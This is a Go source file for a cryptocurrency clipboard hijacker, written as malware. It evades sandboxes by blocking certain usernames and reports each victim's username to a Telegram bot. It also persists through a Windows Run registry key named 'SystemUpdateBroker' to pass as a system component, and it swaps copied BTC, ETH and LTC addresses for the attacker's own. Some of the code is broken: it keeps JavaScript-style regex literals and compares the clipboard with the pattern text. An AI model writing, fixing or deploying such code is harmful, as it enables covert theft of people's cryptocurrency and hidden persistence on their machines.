package main

import (
	"fmt"
	"log"
	"net/http"
	"net/url"
	"os"
	"os/user"
	"path/filepath"
	"regexp"

	"github.com/d-tsuji/clipboard"
	"golang.org/x/sys/windows/registry"
)

// placeholders for now (except for chat id, bot token and crypto addresses those work)
const (
	Startup  = true
	avm      = true
	tg       = true
	chatid   = "chatid"
	bottoken = "bottoken"
	BTC      = "insert btc here"
	ETH      = "insert eth here"
	LTC      = "instert ltc here"
)

func main() {

	antivm()
	telegram()
	startup()
	clip()

}

func clip() {

	getclipboard, err := clipboard.Get()
	if err != nil {
		panic(err)
	}

	ltcregexp := regexp.MustCompile("/^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$/")
	ltcfmt := ltcregexp.String()
	ethregexp := regexp.MustCompile("/(\b0x[a-f0-9]{40}\b)/g")
	btcregexp := regexp.MustCompile("/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/")
	btcb32regexp := regexp.MustCompile("/^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$/")
	btcb32 := btcb32regexp.String()
	ethfmt := ethregexp.String()
	btcfmt := btcregexp.String()

	for {
		if getclipboard == btcb32 {
			fmt.Printf("BTC DETECTED")
			clipboard.Set(BTC)
		}
		if getclipboard == ethfmt {
			fmt.Printf("ETH DETECTED")
			clipboard.Set(ETH)
		}
		if getclipboard == btcfmt {
			fmt.Printf("BTC DETECTED")
			clipboard.Set(BTC)
		}
		if getclipboard == ltcfmt {
			fmt.Printf("LTC DETECTED")
			clipboard.Set(LTC)
		}
	}
}

func telegram() {

	user, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}

	message := ("New File ran, Username:" + user.Username + "\n")
	telegramurl := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", bottoken)
	data := url.Values{}
	data.Set("chat_id", chatid)
	data.Set("text", message)
	resp, err := http.PostForm(telegramurl, data)
	if err != nil {
		fmt.Println("failed too send info too telegram", err)
	}
	defer resp.Body.Close()
}

func antivm() {
	user, err := user.Current()
	if err != nil {
		log.Fatal(err)
	}
	// yes i know blocking usernames is retarded, ill fix it when i feel like it
	blockedusers := map[string]bool{
		"admin":              true,
		"administrator":      true,
		"WDAGUtilityAccount": true,
	}

	if blockedusers[user.Username] {
		os.Exit(0)
	}
}

func startup() {

	exepath, err := filepath.Abs(os.Args[0])
	if err != nil {
		log.Fatal(err)
	}

	key, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
	if err != nil {
		log.Fatal(err)
	}
	defer key.Close()

	err = key.SetStringValue("SystemUpdateBroker", exepath)
	if err != nil {
		panic(err)
	}

}
